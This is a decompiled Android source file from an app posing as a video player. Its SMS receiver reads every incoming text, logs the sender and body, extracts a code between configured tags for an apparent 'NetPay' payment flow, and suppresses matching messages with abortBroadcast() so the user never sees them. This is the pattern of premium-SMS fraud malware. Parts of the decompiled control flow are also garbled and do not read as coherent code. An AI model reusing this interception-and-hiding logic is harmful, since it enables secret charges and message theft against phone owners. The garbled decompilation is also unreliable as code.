package com.videoclient.player.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.a.a.g;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;

class a
  extends BroadcastReceiver
{
  a(MyService paramMyService) {}
  
  private boolean a(String paramString1, String paramString2)
  {
    g.a("del..sms..");
    Object localObject = MyService.a.iterator();
    if (!((Iterator)localObject).hasNext()) {
      paramString2 = MyService.b.iterator();
    }
    do
    {
      if (!paramString2.hasNext())
      {
        return false;
        if (paramString2.indexOf((String)((Iterator)localObject).next()) == -1) {
          break;
        }
        return true;
      }
      localObject = (String)paramString2.next();
    } while ((paramString1 == null) || (paramString1.indexOf((String)localObject) == 1));
    return true;
  }
  
  private boolean b(String paramString1, String paramString2)
  {
    g.a("cut..sms.." + MyService.d);
    if (MyService.c == null)
    {
      g.a("NetPay..checkAns..tags..is..null");
      return false;
    }
    paramString1 = MyService.c.iterator();
    do
    {
      if (!paramString1.hasNext())
      {
        if ((MyService.d == null) || (MyService.d.length != 2)) {
          break;
        }
        int i = paramString2.indexOf(MyService.d[0]);
        int j = paramString2.indexOf(MyService.d[1]);
        if (j <= i) {
          break;
        }
        paramString1 = paramString2.substring(i + MyService.d[0].length(), j);
        com.videoclient.player.b.a.a(this.a, paramString1);
        return false;
      }
    } while (paramString2.indexOf((String)paramString1.next()) != -1);
    g.a("NetPay..tags..check..out");
    return false;
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    g.a("receiver..get..");
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      paramIntent = (Object[])paramIntent.getExtras().get("pdus");
      if (paramIntent != null) {}
    }
    else
    {
      return;
    }
    paramContext = new SmsMessage[paramIntent.length];
    StringBuffer localStringBuffer = new StringBuffer();
    int i = 0;
    for (;;)
    {
      if (i >= paramContext.length)
      {
        paramIntent = localStringBuffer.toString();
        paramContext = paramContext[0].getDisplayOriginatingAddress();
        g.a("get..message..Port:" + paramContext + ",msg:" + paramIntent);
        b(paramContext, paramIntent);
        if (!a(paramContext, paramIntent)) {
          break;
        }
        abortBroadcast();
        return;
      }
      paramContext[i] = SmsMessage.createFromPdu((byte[])paramIntent[i]);
      localStringBuffer.append(paramContext[i].getDisplayMessageBody());
      i += 1;
    }
  }
}
